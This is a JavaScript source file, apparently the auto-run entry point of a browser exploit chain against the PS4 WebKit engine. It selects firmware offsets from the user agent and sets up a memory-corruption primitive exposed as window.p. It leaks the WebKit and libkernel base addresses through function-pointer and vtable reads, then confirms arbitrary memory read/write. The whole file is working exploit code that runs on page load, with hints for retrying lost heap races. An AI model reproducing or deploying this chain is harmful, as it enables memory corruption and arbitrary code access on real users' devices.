/** Auto-run: primitive → 2e Leak+lk → R/W proof (GitHub Pages bundle). */
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";
import { establishPrimitive, trimExploitDebris, getCoreNative } from "./core.js";
import { runArwProofVerbose } from "./arw_proof.js";
import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
import {
    persistSessionBases, saveLibkernelSession, saveLastFnPtr,
} from "./libkernel_resolve.js";

const BUILD = "arw-standalone-3";
const LOG_MAX = 1200;

const params = new URLSearchParams(location.search);
const VERBOSE_PRIM = params.get("verbose") === "1";
const PROBE_MODULES = params.get("modules") === "1";
const NO_AUTO = params.get("noauto") === "1";
const lines = [];
const retain = [];
let started = false;
let readPrimitivePass = false;

const PRIM_LOG = /FAIL|ERROR|PASS|PRIMITIVE|READ-PRIMITIVE|GIVE-UP|ADDROF-RETURNED|ADDROF-COPY|HOLDER|RW-CARRIER|FAKE-ADDRESS|NO-RESULT|LOAD-THREW|COMPOSITION|PLACEMENT|ZERO-HEADER|ATTEMPT-START|CORE-GIVE-UP|SSV-RETURNED|TRIM|JSC-PROFILE/i;

function $(id) { return document.getElementById(id); }

function renderLog() {
    const o = $("out");
    if (!o) return;
    o.textContent = lines.join("\n");
    o.scrollTop = o.scrollHeight;
}

function log(tag, detail) {
    const line = tag + (detail ? "  " + detail : "");
    lines.push(line);
    if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
    renderLog();
}

function flushLogSession() {
    try {
        sessionStorage.setItem("wk-arw-log", lines.slice(-800).join("\n"));
    } catch (_) { }
}

function state(msg, cls) {
    const s = $("state");
    if (s) { s.textContent = msg; s.className = cls || ""; }
}

function groomLabel() {
    return params.get("g") || "default";
}

function parseAddr(raw) {
    if (!raw) return null;
    let s = String(raw).replace(/^0x/i, "").trim();
    if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
    if (s.length < 16) s = s.padStart(16, "0");
    return new int64(parseInt(s.slice(-8), 16) >>> 0, parseInt(s.slice(0, -8), 16) >>> 0);
}

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function chainWebkitBase(off) {
    let webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
    const nativeFn = parseAddr(sessionStorage.getItem("wk-nativeFn"));
    const anchorOff = off.wk_parseint_native != null ? off.wk_parseint_native : off.wk_expm1_builtin;
    if (nativeFn && anchorOff) {
        const derived = nativeFn.sub32(anchorOff);
        if (derived) webkitBase = derived;
    }
    return webkitBase;
}

/** parseInt carrier snapshot or expm1 fallback — lightweight, no slab. */
function persistWebkitBasesLight(p, off, carrier) {
    if (!p || !off) return null;
    let nativeFn = null;
    if (carrier && carrier.native && carrier.native.nativeFn != null) {
        const nf = carrier.native.nativeFn;
        if (typeof nf === "object" && nf.low != null) nativeFn = nf;
        else if (typeof nf === "number" && nf > 0)
            nativeFn = new int64(nf >>> 0, Math.floor(nf / 0x100000000));
    }
    if (!nativeFn) {
        const cell = p.leakval(Math.expm1);
        nativeFn = read8p(p, read8p(p, cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function || 0x28));
    }
    if (!nativeFn) return null;
    const anchorOff = off.wk_parseint_native != null ? off.wk_parseint_native : off.wk_expm1_builtin;
    const webkitBase = anchorOff ? nativeFn.sub32(anchorOff) : null;
    persistSessionBases(nativeFn, webkitBase, { trust: "arw" });
    return webkitBase;
}

async function run2eLk(p, off, carrier) {
    let webkitBase = chainWebkitBase(off);
    if (!webkitBase) {
        try {
            webkitBase = persistWebkitBasesLight(p, off, carrier);
            if (webkitBase) log("WEBKIT-BASE", String(webkitBase));
        } catch (e) {
            log("WEBKIT-BASE-WARN", e.message || String(e));
        }
    }
    if (!webkitBase) {
        log("2E-SKIP", "no webkitBase — lk vote skipped");
        return false;
    }

    log("2E-LK", BUILD + " — vtable leak + lk vote");
    try {
        const vtslots = params.get("vtslots");
        const result = await probeLibkernelViaVtable({
            p,
            carrier: carrier || null,
            webkitBase,
            off,
            log,
            read8: read8p,
            read4: read4p,
            yieldFn: (ms) => new Promise((r) => setTimeout(r, ms)),
            opts: {
                full: params.get("full") === "1",
                vtslots: vtslots ? parseInt(vtslots, 10) : undefined,
                retain,
            },
        });
        if (result.ok && result.lk) {
            const via = result.hit ? (result.hit.method + "/" + result.hit.via) : "?";
            log("LK-OK", result.lk + " (" + via + ")");
            try {
                sessionStorage.setItem("wk-libkernelBase", String(result.lk).replace(/^0x/i, ""));
            } catch (_) { }
            if (result.hit && result.hit.fnPtr) saveLastFnPtr(result.hit.fnPtr);
            saveLibkernelSession(result.lk, result.hit && result.hit.iatRva != null
                ? result.hit.iatRva : null, { forced: true });
            log("LK-HOT", "libkernel saved — 0 reads @ lk");
            return true;
        }
        log("LK-HINT", "2e miss — ?g=drain:512 or ?full=1 (R/W proof continues)");
        return false;
    } catch (e) {
        log("LK-FAIL", e.message || String(e));
        return false;
    }
}

async function runPipeline() {
    if (started) return;
    started = true;
    readPrimitivePass = false;
    lines.length = 0;
    try { sessionStorage.removeItem("wk-arw-log"); } catch (_) { }

    state("running…", "warn");
    log("BOOT", BUILD + "  groom=" + groomLabel() + "  auto=1");

    const detected = offsetsFor(navigator.userAgent);
    log("UA-FW", (detected.key || "unknown") + (detected.off ? "  offsets loaded" : "  NO OFFSETS"));
    if (detected.off && detected.off.fw_status)
        log("OFFSETS", detected.off.fw_status);

    try {
        log("STEP", "═══ PHASE 1: slopkit-core primitive ═══");
        const carrier = await establishPrimitive({
            maxAttempts: 0,
            skipTrimDebris: true,
            onEvent: (tag, detail, attempt) => {
                if (!VERBOSE_PRIM && !PRIM_LOG.test(tag)) return;
                const prefix = attempt != null ? "[a" + attempt + "] " : "";
                log(prefix + tag, detail || "");
                if (tag === "READ-PRIMITIVE-PASS") readPrimitivePass = true;
            },
        });

        log("STEP", "═══ PHASE 2: install window.p ═══");
        installWindowP(carrier, {
            promote: false,
            onEvent: (t, d) => log(t, d || ""),
        });
        window._wkCarrier = carrier;

        if (!carrier.native) {
            const nat = getCoreNative(carrier);
            if (nat) carrier.native = nat;
        }

        const p = window.p;
        if (!p) throw new Error("window.p missing after installWindowP");

        try { trimExploitDebris(); } catch (e) {
            log("TRIM-WARN", e.message || String(e));
        }

        if (pairStatus.state === "broken")
            throw new Error("pair promotion broken — reload tab");

        log("PRIMITIVE-OK", "window.p live  pair=" + pairStatus.state);

        const off = detected.off;
        if (!off) throw new Error("no firmware offsets for this UA");

        log("STEP", "═══ PHASE 3: 2e Leak+lk ═══");
        await run2eLk(p, off, carrier);

        log("STEP", "═══ PHASE 4: R/W proof ═══");
        const proof = runArwProofVerbose(p, off, carrier, {
            log,
            readPrimitivePass,
            pairStatus,
            probeModules: PROBE_MODULES,
            verboseLeak: VERBOSE_PRIM,
        });

        flushLogSession();
        if (proof.ok) {
            state("arbitrary r/w achieved", "ok");
            try {
                sessionStorage.setItem("wk-arw-ok", JSON.stringify({
                    t: Date.now(),
                    fw: detected.key,
                    webkitBase: proof.webkitBase ? String(proof.webkitBase) : "",
                    lk: sessionStorage.getItem("wk-libkernelBase") || "",
                }));
            } catch (_) { }
        } else {
            state("proof incomplete", "bad");
        }
    } catch (e) {
        log("FAIL", e.message || String(e));
        if (/oom|out of memory|allocation/i.test(String(e.message)))
            log("HINT", "OOM — reload tab; use ?g=drain:96; avoid ?verbose=1");
        else if (/gave up|race|COMPOSITION|PLACEMENT/i.test(String(e.message)))
            log("HINT", "race lost — close browser, reload ?g=drain:512");
        flushLogSession();
        state("failed", "bad");
    }
}

function init() {
    state("starting…", "warn");
    log("AUTO", "primitive → 2e → R/W proof  (?noauto=1 to disable)");
    if (NO_AUTO) {
        state("noauto=1 — reload without it to run", "warn");
        return;
    }
    runPipeline();
}

init();
